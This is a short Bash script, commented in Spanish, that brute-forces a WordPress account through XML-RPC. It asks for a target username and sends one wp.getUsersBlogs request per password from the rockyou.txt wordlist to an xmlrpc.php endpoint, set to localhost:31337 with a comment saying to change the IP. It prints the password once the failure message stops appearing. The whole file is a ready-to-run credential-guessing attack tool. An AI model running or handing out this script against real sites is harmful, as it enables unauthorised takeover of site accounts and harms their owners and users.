#!/bin/bash

# Función para manejar Ctrl+C
function ctrl_c(){
  echo -e "\n\n[+] Saliendo...\n"
  exit 1
}

# Capturar la señal de interrupción (Ctrl+C)
trap ctrl_c SIGINT

# Solicitar el nombre de usuario a atacar
read -p "Introduce el nombre de usuario a atacar: " target_user

# Función para crear el archivo XML con las credenciales a probar
function createXML(){
    password=$1

    xmlFile="""  
<?xml version="1.0" encoding="UTF-8"?>  
<methodCall>  
<methodName>wp.getUsersBlogs</methodName>  
<params>  
<param><value>$target_user</value></param>  
<param><value>$password</value></param>  
</params>  
</methodCall>"""  

    echo "$xmlFile" > file.xml

    response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml) ##### CAMBIAR IP DEL WORDPRESS

    if [ ! "$(echo "$response" | grep 'Incorrect username or password.')" ]; then  
        echo -e "\n[+] La contraseña para el usuario $target_user es $password"  
        exit 0  
    fi  
}  

# Leer las contraseñas del diccionario y probarlas
cat /usr/share/wordlists/rockyou.txt | while read password; do  
    createXML "$password"  
done  